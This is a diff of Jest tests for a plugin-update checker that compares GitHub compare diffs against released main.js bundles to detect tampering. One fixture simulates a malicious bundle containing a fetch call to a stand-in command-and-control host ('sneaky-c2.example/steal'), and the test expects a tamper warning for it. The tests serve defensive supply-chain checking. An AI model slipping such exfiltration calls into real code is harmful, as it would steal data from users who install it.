@@ -104,7 +104,7 @@ describe('githubDiff', () => {
         expect(mockedRequestUrl).toHaveBeenCalledTimes(2);
     });
 
-    it('falls back gracefully to release-notes-only when compare tags do not exist', async () => {
+    it('falls back gracefully to release-notes-only when compare tags and main.js asset are unavailable', async () => {
         const mockedRequestUrl = requestUrl as jest.Mock;
         mockedRequestUrl
             .mockResolvedValueOnce({ status: 404, headers: {}, text: '' })
@@ -120,5 +120,70 @@ describe('githubDiff', () => {
 
         expect(diff.sourceKind).toBe('release-notes-only');
         expect(diff.diffText).toContain('Bugfixes only.');
+    });
+
+    it('inspects release main.js bundle directly when GitHub compare tags do not match', async () => {
+        const mockedRequestUrl = requestUrl as jest.Mock;
+        mockedRequestUrl
+            .mockResolvedValueOnce({ status: 404, headers: {}, text: '' })
+            .mockResolvedValueOnce({ status: 404, headers: {}, text: '' })
+            .mockResolvedValueOnce({ status: 200, headers: {}, text: '[]' })
+            .mockResolvedValueOnce({
+                status: 200,
+                headers: {},
+                text: 'const a=1;console.log("safe update");',
+            });
+
+        const diff = await fetchPluginUpdateDiff({
+            repoPath: 'org/repo',
+            fromVersion: '1.0.7',
+            toVersion: '1.0.8',
+            mainJsAssetId: 999,
+            installedMainJs: 'const a=1;',
+            fallbackNotes: 'Patch release.',
+        });
+
+        expect(diff.sourceKind).toBe('release-bundle-diff');
+        expect(diff.changedFiles).toEqual(['release-asset/main.js']);
+        expect(diff.diffText).toContain('console.log("safe update")');
+    });
+
+    it('detects tamper mismatch between GitHub compare diff and release main.js asset', async () => {
+        const mockedRequestUrl = requestUrl as jest.Mock;
+        mockedRequestUrl
+            .mockResolvedValueOnce({
+                status: 200,
+                headers: {},
+                text: JSON.stringify({
+                    html_url: 'https://github.com/org/repo/compare/1.0.0...1.0.1',
+                    commits: [{ commit: { message: 'docs: update readme' } }],
+                    files: [
+                        {
+                            filename: 'README.md',
+                            status: 'modified',
+                            additions: 1,
+                            deletions: 0,
+                            patch: '+Updated docs',
+                        },
+                    ],
+                }),
+            })
+            .mockResolvedValueOnce({
+                status: 200,
+                headers: {},
+                text: 'const a=1;fetch("https://sneaky-c2.example/steal");',
+            });
+
+        const diff = await fetchPluginUpdateDiff({
+            repoPath: 'org/repo',
+            fromVersion: '1.0.0',
+            toVersion: '1.0.1',
+            mainJsAssetId: 555,
+            installedMainJs: 'const a=1;',
+        });
+
+        expect(diff.sourceKind).toBe('github-compare+bundle');
+        expect(diff.tamperWarnings.length).toBeGreaterThan(0);
+        expect(diff.tamperWarnings.join(' ')).toContain('sneaky-c2.example');
     });
 });
